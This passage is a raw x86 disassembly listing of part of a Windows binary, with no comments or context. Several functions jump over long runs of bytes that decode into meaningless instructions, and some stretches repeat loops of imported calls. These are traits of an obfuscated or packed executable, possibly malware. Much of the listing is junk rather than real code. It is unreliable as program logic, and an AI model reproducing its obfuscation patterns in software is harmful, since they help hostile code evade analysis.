  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
  404a4d:	mov    eax,DWORD PTR [ebp+0x18]
  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	pop    ss
  404a8c:	lea    edi,[ebp+0x51]
  404a8f:	inc    edi
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	cdq    
  404a98:	out    0x76,al
  404a9a:	cwde   
  404a9b:	inc    edi
  404a9c:	or     al,0xd5
  404a9e:	repnz sub BYTE PTR [edx+0xe],ah
  404aa2:	xor    eax,0xd94def8e
  404aa7:	cwde   
  404aa8:	inc    edx
  404aa9:	xor    bh,BYTE PTR [ebp+0x5e4118de]
  404aaf:	xchg   edi,eax
  404ab0:	cmc    
  404ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ab2:	test   al,0x82
  404ab4:	scas   al,BYTE PTR es:[edi]
  404ab5:	inc    ecx
  404ab6:	popf   
  404ab7:	add    eax,0x2cf468c9
  404abc:	add    edi,eax
  404abe:	or     bh,dl
  404ac0:	aam    0x41
  404ac2:	xchg   ecx,eax
  404ac3:	xchg   BYTE PTR [edx-0x57f0e6c1],ah
  404ac9:	sub    BYTE PTR ds:[edi+edx*4-0x23],dh
  404ace:	mov    esi,0x3a1f2136
  404ad3:	or     dh,BYTE PTR [ecx-0xa78a78d]
  404ad9:	in     al,0xaf
  404adb:	in     al,dx
  404adc:	outs   dx,DWORD PTR ds:[esi]
  404add:	out    0x32,al
  404adf:	or     dh,BYTE PTR [ecx]
  404ae1:	xor    eax,0x36927d11
  404ae6:	fwait
  404ae7:	mov    ebp,0xe191d638
  404aec:	add    bl,ah
  404aee:	test   DWORD PTR [edx-0x20],esp
  404af1:	mov    al,ds:0xcc9b305d
  404af6:	lods   al,BYTE PTR ds:[esi]
  404af7:	test   dh,al
  404af9:	and    esi,DWORD PTR [eax]
  404afb:	and    DWORD PTR [eax-0x42],ebx
  404afe:	adc    DWORD PTR [ebx+0x6d],edi
  404b01:	and    DWORD PTR [edi+0x44d3fcea],0x30
  404b08:	sbb    ecx,DWORD PTR [ecx-0xb]
  404b0b:	ins    DWORD PTR es:[edi],dx
  404b0c:	test   al,0xd8
  404b0e:	mov    ebx,0x31a6f9c3
  404b13:	cmp    esi,DWORD PTR [edi]
  404b15:	repnz xor esp,edx
  404b18:	fstp   DWORD PTR [eax]
  404b1a:	rcl    ebp,0x67
  404b1d:	stos   DWORD PTR es:[edi],eax
  404b1e:	pop    ds
  404b1f:	mov    BYTE PTR [ebx-0x7],ah
  404b22:	pop    esp
  404b23:	xchg   edx,eax
  404b24:	xchg   esi,eax
  404b25:	ret    0x79ae
  404b28:	sub    bh,bl
  404b2a:	mov    dh,0x83
  404b2c:	adc    DWORD PTR [edx-0x63],ebp
  404b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b30:	sti    
  404b31:	bound  ecx,QWORD PTR [edx]
  404b33:	ins    BYTE PTR es:[edi],dx
  404b34:	jbe    0x404b7a
  404b36:	(bad)  
  404b37:	sbb    BYTE PTR [esi],ah
  404b39:	in     al,dx
  404b3a:	xchg   ebp,eax
  404b3b:	pop    esp
  404b3c:	mov    cs,WORD PTR [ebp+0x49a75017]
  404b42:	in     al,0x52
  404b44:	loope  0x404afc
  404b46:	pop    ss
  404b47:	mov    ebp,0x9dd96240
  404b4c:	lods   eax,DWORD PTR ds:[esi]
  404b4d:	mov    WORD PTR [ecx+0x4b],fs
  404b50:	sub    ebx,DWORD PTR [eax-0x2df00e99]
  404b56:	mov    dh,0x98
  404b58:	imul   ecx,DWORD PTR [edx+0xce69a7b],0x62
  404b5f:	dec    ebx
  404b60:	jmp    FWORD PTR [edx-0x1b]
  404b63:	out    0x16,al
  404b65:	sbb    BYTE PTR [ebp+ebx*1-0x2f],0x24
  404b6a:	mov    edi,0x75885bb3
  404b6f:	ss or  eax,0xf40434c8
  404b75:	or     ecx,edi
  404b77:	xor    edi,eax
  404b79:	adc    edi,DWORD PTR [esi+0x11a66742]
  404b7f:	fstp   QWORD PTR gs:[esi+0x1]
  404b83:	adc    bl,BYTE PTR es:[eax]
  404b86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b87:	cdq    
  404b88:	scas   al,BYTE PTR es:[edi]
  404b89:	mov    ebx,0xaed17048
  404b8e:	cmp    BYTE PTR [ecx-0x6d],dh
  404b91:	cmp    eax,0x8d85f519
  404b96:	fimul  DWORD PTR [ebp+0x52]
  404b99:	dec    esi
  404b9a:	ret    
  404b9b:	jp     0x404b56
  404b9d:	push   edi
  404b9e:	and    ah,BYTE PTR [ebp+eiz*1+0x2a0abb66]
  404ba5:	mov    edi,0xbca411f9
  404baa:	sahf   
  404bab:	mov    DWORD PTR [edi+0x1d],ebx
  404bae:	in     eax,dx
  404baf:	lods   eax,DWORD PTR ds:[esi]
  404bb0:	mov    dl,0x8
  404bb2:	ins    BYTE PTR es:[edi],dx
  404bb3:	push   0xb3dca79
  404bb8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bba:	cwde   
  404bbb:	cs mov eax,cs
  404bbe:	(bad)  
  404bbf:	sub    ecx,DWORD PTR [ebx+0x51]
  404bc2:	ja     0x404bbc
  404bc4:	push   edx
  404bc5:	mov    ecx,0xb5aae0cd
  404bca:	push   ds
  404bcb:	mov    esp,0x1dc9524c
  404bd0:	pop    ss
  404bd1:	jbe    0x404c50
  404bd3:	icebp  
  404bd4:	lds    ecx,FWORD PTR [ebx+eax*1-0x5a]
  404bd8:	fistp  DWORD PTR [ecx]
  404bda:	mov    BYTE PTR [esi],0x80
  404bdd:	mov    bh,0xf1
  404bdf:	lahf   
  404be0:	push   esp
  404be1:	ret    0xa5c6
  404be4:	fild   WORD PTR [edx+0x329c3d38]
  404bea:	dec    eax
  404beb:	mov    ds:0xd0ceccb2,eax
  404bf0:	fsub   DWORD PTR [esi+esi*2-0x1e]
  404bf4:	xlat   BYTE PTR ds:[ebx]
  404bf5:	pop    edx
  404bf6:	popa   
  404bf7:	mov    edi,0xaeadd0b1
  404bfc:	sub    BYTE PTR ds:0xedab17d9,al
  404c02:	or     BYTE PTR [esp+esi*2+0x5e],0xd6
  404c07:	rol    BYTE PTR [eax+edi*8+0x5f],1
  404c0b:	mov    ebx,ss
  404c0d:	and    esp,DWORD PTR [edi+0x1a]
  404c10:	mov    bh,0x26
  404c12:	jno    0x404ba6
  404c14:	loop   0x404c58
  404c16:	retf   0x81ed
  404c19:	inc    ebx
  404c1a:	push   ebp
  404c1b:	cld    
  404c1c:	call   0xd46ca1fa
  404c21:	xchg   ebp,eax
  404c22:	mov    DWORD PTR [eax+0x71d42ff4],edi
  404c28:	xchg   ecx,eax
  404c29:	mov    eax,ds:0xc514fd8d
  404c2e:	out    0x53,eax
  404c30:	sbb    al,0xdf
  404c32:	scas   eax,DWORD PTR es:[edi]
  404c33:	cli    
  404c34:	mov    ds:0x2765ec,al
  404c39:	jl     0x404c5c
  404c3b:	outs   dx,DWORD PTR ds:[esi]
  404c3c:	sbb    eax,edi
  404c3e:	xor    al,0x52
  404c40:	retf   
  404c41:	(bad)  
  404c42:	sub    al,0xaa
  404c44:	iret   
  404c45:	cwde   
  404c46:	int3   
  404c47:	lds    edi,FWORD PTR [edi-0x42]
  404c4a:	fnsave [ecx+0x666b72e3]
  404c50:	cmp    cl,BYTE PTR [edx]
  404c52:	push   edx
  404c53:	fwait
  404c54:	mov    al,ds:0x97a6ed26
  404c59:	pushf  
  404c5a:	lds    ecx,FWORD PTR [esi]
  404c5c:	repz mov ds:0xb1256f42,eax
  404c62:	jmp    0x404c11
  404c64:	push   edx
  404c65:	out    0xb6,eax
  404c67:	jnp    0x404c1e
  404c69:	nop
  404c6a:	pop    ds
  404c6b:	add    bh,BYTE PTR [ecx-0x3f]
  404c6e:	jmp    0xda45f3ac
  404c73:	sbb    BYTE PTR [eax+0x3b],dh
  404c76:	push   edi
  404c77:	dec    ebp
  404c78:	call   0x38fb:0x8462d89f
  404c7f:	fisubr DWORD PTR [edx+0x717d3bd5]
  404c85:	pushf  
  404c86:	fsub   st(0),st
  404c88:	mov    dl,0x20
  404c8a:	mov    edi,0xe5294259
  404c8f:	das    
  404c90:	sub    BYTE PTR ds:0x5a1dfc38,al
  404c96:	jnp    0x404c8b
  404c98:	ror    DWORD PTR [ebp-0x10aa51],0xa6
  404c9f:	aam    0xc7
  404ca1:	jns    0x404c79
  404ca3:	dec    edx
  404ca4:	repnz mov esp,edx
  404ca7:	sbb    eax,0xbc435499
  404cac:	ret    0xf884
  404caf:	sub    al,0x58
  404cb1:	lea    edx,[esi]
  404cb3:	out    0xc1,eax
  404cb5:	cmp    BYTE PTR [ebx-0x455fa6e1],bl
  404cbb:	xchg   ecx,eax
  404cbc:	arpl   ax,ax
  404cbe:	loopne 0x404cb0
  404cc0:	pop    esi
  404cc1:	mov    ah,0xed
  404cc3:	cmp    DWORD PTR [eax-0x9],eax
  404cc6:	jl     0x404d03
  404cc8:	sbb    DWORD PTR [edi+0x51f8ab46],edi
  404cce:	push   ecx
  404ccf:	mov    WORD PTR [edi-0x7a1c2a6d],fs
  404cd5:	(bad)
  404cd9:	mov    ds:0x92d95547,al
  404cde:	imul   edx,DWORD PTR [ebx-0x166e7f70],0xffffffdb
  404ce5:	jl     0x404d09
  404ce7:	inc    esi
  404ce8:	int    0xe0
  404cea:	jno    0x404cfd
  404cec:	add    ebx,DWORD PTR [ecx-0x4]
  404cef:	fsubr  st,st(6)
  404cf1:	fdivr  QWORD PTR [edx+ebp*2-0x2f]
  404cf5:	push   edi
  404cf6:	push   edx
  404cf7:	fbld   TBYTE PTR [ebp+0xe]
  404cfa:	(bad)  
  404cfb:	dec    edi
  404cfc:	mov    esp,0x9d889c34
  404d01:	fcmove st,st(4)
  404d03:	mov    esi,0x7a5c035d
  404d08:	jnp    0x404d89
  404d0a:	mov    esp,0x22df069a
  404d0f:	xchg   DWORD PTR [esp+eiz*8],ebp
  404d12:	xor    DWORD PTR [edx+0x17],esi
  404d15:	jno    0x404d50
  404d17:	mov    ah,0xd2
  404d19:	dec    ecx
  404d1a:	adc    al,0x1c
  404d1c:	das    
  404d1d:	mov    bh,0x2
  404d1f:	imul   edx,DWORD PTR [eax+esi*1],0xffffffc6
  404d23:	sahf   
  404d24:	inc    esp
  404d25:	rol    DWORD PTR [edi+0x2bc01e2f],0x3a
  404d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d2d:	stc    
  404d2e:	arpl   WORD PTR [eax+eax*1-0x48],bx
  404d32:	retf   
  404d33:	push   es
  404d34:	sbb    eax,DWORD PTR [edx-0x9]
  404d37:	icebp  
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0xac60b97d
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d81
  404d6a:	adc    DWORD PTR [ebp-0x2f],ecx
  404d6d:	xchg   ah,ah
  404d6f:	xor    al,BYTE PTR [ebp-0x3e40e664]
  404d75:	add    ah,BYTE PTR [ebx+0x7d10e3a5]
  404d7b:	push   esp
  404d7c:	retf   0xf2de
  404d7f:	(bad)  
  404d80:	outs   dx,DWORD PTR ds:[esi]
  404d81:	cmp    eax,0x25fef6b2
  404d86:	outs   dx,BYTE PTR ds:[esi]
  404d87:	push   0xffffffd2
  404d89:	mov    fs,WORD PTR [edx]
  404d8b:	adc    eax,0x3d266abc
  404d90:	dec    edi
  404d91:	xchg   BYTE PTR [edi+0x7a62c127],dl
  404d97:	or     ah,al
  404d99:	call   0xff0d:0xb9fa0e5f
  404da0:	fnstsw WORD PTR [ebx-0x3580b10e]
  404da6:	dec    esp
  404da7:	imul   esp,DWORD PTR [eax],0xae2aea83
  404dad:	dec    edx
  404dae:	in     eax,dx
  404daf:	jno    0x404dd6
  404db1:	lock jnp 0x404d4f
  404db4:	add    BYTE PTR ds:0xf489c98f,ch
  404dba:	into   
  404dbb:	push   ecx
  404dbc:	shl    ebx,cl
  404dbe:	jae    0x404d44
  404dc0:	mov    eax,ds:0x546d9011
  404dc5:	sub    al,0x96
  404dc7:	sub    eax,0x69e8658f
  404dcc:	xor    BYTE PTR [edi+ebp*4+0x2b],dh
  404dd0:	add    ah,dh
  404dd2:	clc    
  404dd3:	sbb    eax,0x87048093
  404dd8:	stc    
  404dd9:	aaa    
  404dda:	sbb    eax,0xed86ea75
  404ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de0:	lds    ecx,FWORD PTR [esi+0x20]
  404de3:	jmp    0xcd81:0x9af41bb3
  404dea:	and    DWORD PTR [eax],edi
  404dec:	push   0x3362ceb0
  404df1:	loope  0x404e49
  404df3:	pop    ecx
  404df4:	cmp    al,dl
  404df6:	lea    esi,ds:[esi]
  404df9:	bnd jle 0x404e62
  404dfc:	ret    0x2c10
  404dff:	fsubr  QWORD PTR [edi-0x5f43fe89]
  404e05:	je     0x404dae
  404e07:	sub    ecx,0x9193b287
  404e0d:	rcl    BYTE PTR [edx],0x63
  404e10:	push   edx
  404e11:	mov    cl,0xb1
  404e13:	fnstsw WORD PTR [eax]
  404e15:	pop    esp
  404e16:	mov    WORD PTR [ebx+0x20],?
  404e19:	mov    gs,WORD PTR [esi+0x2a3ad60f]
  404e1f:	in     al,dx
  404e20:	xor    al,0xb2
  404e22:	xchg   edx,eax
  404e23:	xor    al,0x82
  404e25:	jle    0x404e2f
  404e27:	pop    ss
  404e28:	cli    
  404e29:	in     al,dx
  404e2a:	bound  esi,QWORD PTR [edx]
  404e2c:	pop    ecx
  404e2d:	out    0xb0,al
  404e2f:	jo     0x404e77
  404e31:	ret    
  404e32:	sub    DWORD PTR [edx-0x17],edx
  404e35:	mov    bh,0x4f
  404e37:	retf   0xd4fa
  404e3a:	jne    0x404dd7
  404e3c:	cmp    DWORD PTR [eax],edi
  404e3e:	or     DWORD PTR [ebx],ebx
  404e40:	cli    
  404e41:	retf   0x8d64
  404e44:	in     eax,0x41
  404e46:	fisub  WORD PTR [ebx+ebp*1]
  404e49:	std    
  404e4a:	cdq    
  404e4b:	dec    eax
  404e4c:	mov    edx,0x2dd08afa
  404e51:	push   es
  404e52:	cmp    BYTE PTR [eax+0x407d287c],0xcc
  404e59:	jnp    0x404e1d
  404e5b:	xchg   edi,eax
  404e5c:	dec    ecx
  404e5d:	imul   esp,DWORD PTR ds:0xa658aaa9,0xd
  404e64:	push   edi
  404e65:	popf   
  404e66:	enter  0xaccd,0xab
  404e6a:	retf   0xd897
  404e6d:	sbb    eax,0x36798f2a
  404e72:	fstp   QWORD PTR fs:[eax-0x5034b0f]
  404e79:	push   eax
  404e7a:	rol    BYTE PTR [ebx],0x47
  404e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e7e:	jecxz  0x404e4a
  404e80:	adc    BYTE PTR [edx],cl
  404e82:	aad    0xde
  404e84:	neg    esi
  404e86:	mov    DWORD PTR [edx+edi*1+0x75],edi
  404e8a:	test   eax,0x9ffcd08
  404e8f:	mov    bh,0xbd
  404e91:	lock adc dh,BYTE PTR [ebx+0x7c]
  404e95:	add    DWORD PTR [ebx-0xe],esi
  404e98:	out    dx,al
  404e99:	shl    dh,0x8c
  404e9c:	or     cl,ch
  404e9e:	add    al,0x79
  404ea0:	retf   
  404ea1:	in     eax,0xa8
  404ea3:	popf   
  404ea4:	outs   dx,BYTE PTR ds:[esi]
  404ea5:	sub    ch,BYTE PTR [edi]
  404ea7:	std    
  404ea8:	sbb    esp,DWORD PTR [ebp-0x1a]
  404eab:	and    BYTE PTR [edx],dh
  404ead:	push   ss
  404eae:	dec    ebp
  404eaf:	jmp    0x404f16
  404eb1:	pop    ecx
  404eb2:	or     DWORD PTR [ebx-0x5ff84988],ebx
  404eb8:	mov    ds:0xc2ffbd6,eax
  404ebd:	mov    al,0xfe
  404ebf:	lock mov ds:0xa3733b35,al
  404ec5:	pop    ebx
  404ec6:	and    eax,0xd6c380bc
  404ecb:	mov    fs,WORD PTR [edi+0x4a3529f3]
  404ed1:	sbb    dh,dh
  404ed3:	mov    eax,0xa017ad6
  404ed8:	pushf  
  404ed9:	sub    eax,0xea3204e4
  404ede:	cmp    ecx,0xa
  404ee1:	rcr    BYTE PTR [ecx+0x1a3aa68a],0x54
  404ee8:	(bad)
  404eeb:	pop    edx
  404eec:	aad    0x2e
  404eee:	lds    esp,FWORD PTR [esi+0x650eeffd]
  404ef4:	mov    al,0x32
  404ef6:	push   ebx
  404ef7:	dec    edx
  404ef8:	std    
  404ef9:	mov    eax,ds:0xbf6f1ffa
  404efe:	int3   
  404eff:	out    dx,al
  404f00:	aaa    
  404f01:	or     DWORD PTR [eax-0x3dfaf469],0x2fd37d82
  404f0b:	ret    
  404f0c:	out    dx,al
  404f0d:	xchg   ebx,eax
  404f0e:	out    dx,eax
  404f0f:	call   0x3680:0x5cd89bef
  404f16:	inc    ecx
  404f17:	es je  0x404f25
  404f1a:	in     eax,0xcd
  404f1c:	stc    
  404f1d:	bound  edx,QWORD PTR [ebx-0x41]
  404f20:	ds arpl WORD PTR ds:[edx],bp
  404f24:	sub    DWORD PTR [ebx],ebx
  404f26:	jge    0x404f35
  404f28:	xchg   esp,eax
  404f29:	mov    esp,0x6176b21d
  404f2e:	repnz add BYTE PTR [edi-0x5ac0e695],0x31
  404f36:	adc    esi,edx
  404f38:	out    0xab,eax
  404f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3b:	sbb    al,0x5
  404f3d:	fidivr WORD PTR [ebx-0x1a]
  404f40:	neg    BYTE PTR [ecx]
  404f42:	jns    0x404f5d
  404f44:	arpl   sp,si
  404f46:	retf   
  404f47:	mov    esi,ecx
  404f49:	or     edi,DWORD PTR [esp+ebx*4+0x3]
  404f4d:	cs daa 
  404f4f:	retf   
  404f50:	fisub  DWORD PTR [esi+0x58dfd636]
  404f56:	or     eax,0x81511ff1
  404f5b:	and    eax,0x4303d9
  404f60:	add    BYTE PTR [eax],al
  404f62:	add    BYTE PTR [eax],al
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4303d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4303d9,eax
  404f74:	cmp    DWORD PTR ds:0x4303d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4303d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e754
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea1f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ed57
  404faf:	xor    edx,DWORD PTR ds:0x4303d1
  404fb5:	mov    DWORD PTR ds:0x42ed57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ede9
  404fc8:	mov    eax,ds:0x42e903
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e758
  404fdc:	sub    ecx,DWORD PTR ds:0x4303cd
  404fe2:	mov    DWORD PTR ds:0x42e758,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ed73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ed73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ed73,ecx
  405002:	cmp    DWORD PTR ds:0x42ed73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e953
  405018:	cmp    DWORD PTR ds:0x42ed73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ed73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ed73,ecx
  405034:	cmp    DWORD PTR ds:0x42ed73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	pop    ss
  405053:	sub    BYTE PTR [ebp+0x7e2ed6e7],dh
  405059:	jle    0x4050c9
  40505b:	jg     0x4050db
  40505d:	jle    0x4050cc
  40505f:	mov    al,ds:0xb8039fab
  405064:	adc    DWORD PTR [edi-0x2a1ebaf9],edi
  40506a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40506b:	mov    cl,0x89
  40506d:	popf   
  40506e:	push   0x122808d9
  405073:	inc    eax
  405074:	enter  0x1947,0xca
  405078:	int    0xb4
  40507a:	mov    ecx,esi
  40507c:	ficomp WORD PTR [edx]
  40507e:	or     eax,0xb9714d6
  405083:	cmp    ecx,DWORD PTR ds:[ebp-0x4450ff61]
  40508a:	imul   eax,DWORD PTR [ebx],0xffffffe6
  40508d:	adc    BYTE PTR [esi-0x74],0x4f
  405091:	sbb    al,BYTE PTR [ecx+ebp*8+0xa]
  405095:	lock sbb ebp,esi
  405098:	loop   0x4050af
  40509a:	inc    edx
  40509b:	retf   0xe591
  40509e:	push   ebp
  40509f:	in     eax,dx
  4050a0:	imul   ebx,ebx,0xb7dda518
  4050a6:	mov    dh,0x2
  4050a8:	imul   esi,DWORD PTR [edi+eiz*4+0x7c],0xdfe1851c
  4050b0:	jg     0x4050f1
  4050b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050b3:	sub    eax,0x4f38c18e
  4050b8:	mov    dh,bl
  4050ba:	or     BYTE PTR [ebx+0x5e77aa1e],0xb3
  4050c1:	mov    eax,0x250a9a46
  4050c6:	push   edi
  4050c7:	icebp  
  4050c8:	jns    0x405131
  4050ca:	test   al,0xea
  4050cc:	scas   al,BYTE PTR es:[edi]
  4050cd:	nop
  4050ce:	arpl   WORD PTR [edx-0x11],bx
  4050d1:	(bad)  
  4050d2:	mov    dl,0xe3
  4050d4:	and    eax,edx
  4050d6:	mov    ebp,0x8eee14e4
  4050db:	xchg   edi,eax
  4050dc:	arpl   WORD PTR [ebx-0x4d687a13],cx
  4050e2:	pop    esi
  4050e3:	(bad)  
  4050e4:	adc    eax,0xfa0e635e
  4050e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ea:	fimul  WORD PTR [eax-0x22]
  4050ed:	jle    0x4050a4
  4050ef:	fidivr WORD PTR [ebp-0x70]
  4050f2:	pop    ebx
  4050f3:	xlat   BYTE PTR ds:[ebx]
  4050f4:	cmp    esi,DWORD PTR [esi]
  4050f6:	ret    
  4050f7:	fwait
  4050f8:	xrelease xchg BYTE PTR [eax-0xd966f10],dh
  4050ff:	mov    edi,0x6451db49
  405104:	cmp    eax,0x747136a7
  405109:	cld    
  40510a:	ret    
  40510b:	adc    esp,DWORD PTR [edi]
  40510d:	adc    DWORD PTR [ebx],eax
  40510f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405110:	loope  0x405126
  405112:	or     al,0xd8
  405114:	xchg   edx,eax
  405115:	(bad)  
  405117:	xchg   esp,eax
  405118:	sub    DWORD PTR [ecx+0x47f81e15],ecx
  40511e:	jns    0x405180
  405120:	dec    esp
  405121:	adc    bh,BYTE PTR [edx+0x6c]
  405124:	inc    eax
  405125:	pusha  
  405126:	jge    0x765b9ca2
  40512c:	inc    eax
  40512d:	mov    BYTE PTR [edx+0x5adf4bf5],ch
  405133:	call   0xf71063e3
  405138:	push   0xd0519eab
  40513d:	mov    esp,0x3731c92f
  405142:	xchg   DWORD PTR [edi+0x7a],esp
  405145:	mov    bh,0x39
  405147:	aam    0xcb
  405149:	dec    ebp
  40514a:	sub    al,0x72
  40514c:	mov    ecx,0x2672f4a8
  405151:	inc    edi
  405152:	and    BYTE PTR [ebx-0x18],0x8a
  405156:	fimul  DWORD PTR [edx+ecx*1-0x49]
  40515a:	mov    esi,0x54a28705
  40515f:	shr    DWORD PTR [ebx-0x2bf9136c],1
  405165:	mov    ch,0x2
  405167:	fiadd  WORD PTR [esi-0x742695dc]
  40516d:	lods   al,BYTE PTR ds:[esi]
  40516e:	or     bl,dh
  405170:	stos   DWORD PTR es:[edi],eax
  405171:	fwait
  405172:	cwde   
  405173:	call   0xf9800dbe
  405178:	add    DWORD PTR [ebx-0x2c00a4d7],0xf053b8fe
  405182:	inc    edx
  405183:	add    al,0xfc
  405185:	push   0x9
  405187:	jno    0x405137
  405189:	jle    0x405196
  40518b:	in     eax,0x3
  40518d:	and    BYTE PTR [esi-0x73],bl
  405190:	ins    BYTE PTR es:[edi],dx
  405191:	pop    ebp
  405192:	(bad)  
  405194:	push   cs
  405195:	fldenv [edx]
  405197:	add    DWORD PTR [esi+0x739839a6],edx
  40519d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40519e:	jns    0x405162
  4051a0:	add    al,0x61
  4051a2:	neg    DWORD PTR [ebp+0x30]
  4051a5:	mov    al,0x67
  4051a7:	xchg   edi,eax
  4051a8:	or     al,0x5e
  4051aa:	inc    esp
  4051ab:	loope  0x4051ad
  4051ad:	out    0x62,eax
  4051af:	leave  
  4051b0:	dec    edx
  4051b1:	fdiv   DWORD PTR [ebp+0x69cf71d2]
  4051b7:	pop    es
  4051b8:	push   0x42
  4051ba:	dec    esp
  4051bb:	xlat   BYTE PTR ds:[ebx]
  4051bc:	sub    eax,0xd08464f4
  4051c1:	cmp    al,0xf2
  4051c3:	dec    esi
  4051c4:	add    DWORD PTR [ebx],ebx
  4051c6:	lods   al,BYTE PTR ds:[esi]
  4051c7:	mov    edx,0x5f8c56a9
  4051cc:	int    0xa2
  4051ce:	mov    edx,0xc0b6b6ee
  4051d3:	jp     0x405184
  4051d5:	in     al,0x81
  4051d7:	in     eax,dx
  4051d8:	stos   BYTE PTR es:[edi],al
  4051d9:	adc    eax,0x94be451
  4051de:	scas   eax,DWORD PTR es:[edi]
  4051df:	retf   
  4051e0:	popa   
  4051e1:	cwde   
  4051e2:	sub    al,0x49
  4051e4:	push   eax
  4051e5:	aad    0x9a
  4051e7:	mov    ds:0x354eb5ab,al
  4051ec:	and    ecx,ecx
  4051ee:	mov    dl,0xfb
  4051f0:	mov    ebx,DWORD PTR [edi]
  4051f2:	shr    esi,0x32
  4051f5:	rcl    DWORD PTR [edx+0x39e96b0a],1
  4051fb:	test   dh,0x37
  4051fe:	pop    ds
  4051ff:	lock inc ecx
  405201:	sub    bl,bl
  405203:	and    eax,0x47418d31
  405208:	(bad)  
  405209:	iret   
  40520a:	push   esi
  40520b:	das    
  40520c:	fild   DWORD PTR [ebp+0x1e]
  40520f:	xor    BYTE PTR [ebx],ah
  405211:	sub    al,0xd8
  405213:	jle    0x4051d7
  405215:	or     BYTE PTR [ebx],0xe2
  405218:	out    dx,eax
  405219:	mov    edi,0x4a67153c
  40521e:	ins    BYTE PTR es:[edi],dx
  40521f:	ja     0x40528d
  405221:	bound  edx,QWORD PTR [edx]
  405223:	in     al,dx
  405224:	and    ah,dh
  405226:	inc    ebx
  405227:	ds int3 
  405229:	xor    ebp,0x9
  40522c:	lds    eax,FWORD PTR [ebp-0x1f3bfd8a]
  405232:	xor    al,0xc0
  405234:	sub    ebx,0x46
  405237:	pop    ds
  405238:	das    
  405239:	iret   
  40523a:	shr    DWORD PTR [esi-0x587b98a7],0x90
  405241:	mov    esp,0xe8069782
  405246:	out    0x24,eax
  405248:	sub    eax,0xe2fc7534
  40524d:	and    eax,0x510854b9
  405252:	pop    es
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
